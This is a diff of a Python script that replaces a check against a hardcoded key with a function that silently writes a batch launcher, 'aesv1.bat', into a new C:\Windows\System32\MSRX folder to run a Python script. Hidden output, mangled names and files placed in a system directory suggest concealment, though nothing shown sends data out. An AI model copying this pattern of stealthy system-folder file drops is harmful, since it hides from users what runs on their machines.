@@ -272,11 +272,28 @@ else:
     print("Success.")
 
 os.system('cls')
-if file_contentsx1 =="04yb8u5ih5FGB":
-    file_contentpathx = read_file_contentxasxas(file_pathxpath)
-    create_batch_file(file_contentpathx, r"C:\Windows\System32\MSX\aesprnoguiv2.py")
-else:
-    create_batch_file("py -3.11", r"C:\Windows\System32\MSX\aesprnoguiv2.py")
+def create_batch_file(python_command, script_name):
+    # Define the directory and file name
+    directory = r"C:\Windows\System32\MSRX"
+    filename = "aesv1.bat"
+    filepath = os.path.join(directory, filename)
+
+    # Check if the batch file already exists
+    if not os.path.exists(filepath):
+        # Content of the batch file, with python_command and script_name as parameters
+        batch_content = f"@echo off\n{python_command} {script_name} || echo errorwithpath"
+
+        # Create the directory if it doesn't exist
+        os.makedirs(directory, exist_ok=True)
+
+        # Write the content to the batch file
+        with open(filepath, 'w') as file:
+            file.write(batch_content)
+
+        print(f"")
+    else:
+        print("")
+create_batch_file("py -3.11", r"C:\Windows\System32\MSX\aesprnoguiv2.py")
 batch_file_path = r"C:\Windows\System32\MSX\aespremium_nogui.bat"
 os.system('cls')
 
